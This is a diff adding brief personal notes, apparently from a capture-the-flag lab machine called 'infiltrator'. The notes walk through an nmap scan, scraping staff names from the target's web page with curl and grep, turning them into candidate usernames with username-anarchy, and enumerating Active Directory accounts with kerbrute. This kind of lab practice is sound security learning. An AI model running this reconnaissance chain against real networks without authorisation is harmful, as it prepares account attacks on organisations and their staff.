@@ -1,0 +1,23 @@
+nmap -sV -sC -vv -oA nmap/infiltrator ip address
+
+trying to create a user list
+
+start with curl ip address
+
+curl ip address | grep one of the names from the domain site
+ex: curl 10.129.237.226 | grep -i olivia
+then grep for the tags that come up for the name 
+
+ex curl 10.129.237.226 | grep h4
+ex curl -s -q 10.129.237.226 | grep 'h4>.[0-9]'
+curl -s -q 10.129.237.226 | grep -oP 'h4>.[0-9]* \K(.*?)(?=<)' > potential-names.txt
+
+install username-anarchy: https://github.com/urbanadventurer/username-anarchy.git
+
+use username-anarchy -i potential-names.txt > potential-users.txt
+
+user kerbrute on the potential users.txt file 
+
+kerbrute userenum --dc ip address -d domain name potential-users.txt
+
+install kerbrute dev version not the release version
